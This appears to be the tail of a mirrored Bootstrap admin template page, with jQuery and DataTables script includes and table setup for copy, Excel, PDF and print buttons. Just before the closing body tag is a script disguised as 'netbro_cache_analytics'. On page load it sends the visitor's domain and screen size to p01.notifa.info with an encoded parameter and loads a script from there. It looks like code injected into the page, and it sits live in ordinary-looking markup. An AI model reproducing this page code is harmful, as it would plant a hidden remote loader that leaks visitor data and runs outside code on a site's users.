<script src="/assets/js/jquery.min.js"></script>
<script src="/assets/js/popper.min.js"></script>
<script src="/assets/js/bootstrap.min.js"></script>

<!-- simplebar js -->
<script src="/assets/plugins/simplebar/js/simplebar.js"></script>
<!-- waves effect js -->
<script src="/assets/js/waves.js"></script>
<!-- sidebar-menu js -->
<script src="/assets/js/sidebar-menu.js"></script>
<!-- Custom scripts -->
<script src="/assets/js/app-script.js"></script>

<!--Data Tables js-->
<script src="/assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js"></script>
<script src="/assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js"></script>
<script src="/assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js"></script>
<script src="/assets/plugins/bootstrap-datatable/js/buttons.bootstrap4.min.js"></script>
<script src="/assets/plugins/bootstrap-datatable/js/jszip.min.js"></script>
<script src="/assets/plugins/bootstrap-datatable/js/pdfmake.min.js"></script>
<script src="/assets/plugins/bootstrap-datatable/js/vfs_fonts.js"></script>
<script src="/assets/plugins/bootstrap-datatable/js/buttons.html5.min.js"></script>
<script src="/assets/plugins/bootstrap-datatable/js/buttons.print.min.js"></script>
<script src="/assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js"></script>

  <script>
   $(document).ready(function() {
    //Default data table
     $('#default-datatable').DataTable();


     var table = $('#example').DataTable( {
      lengthChange: false,
      buttons: [ 'copy', 'excel', 'pdf', 'print', 'colvis' ]
    } );

   table.buttons().container()
      .appendTo( '#example_wrapper .col-md-6:eq(0)' );
    
    } );

  </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/table-data-tables.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:18:44 GMT -->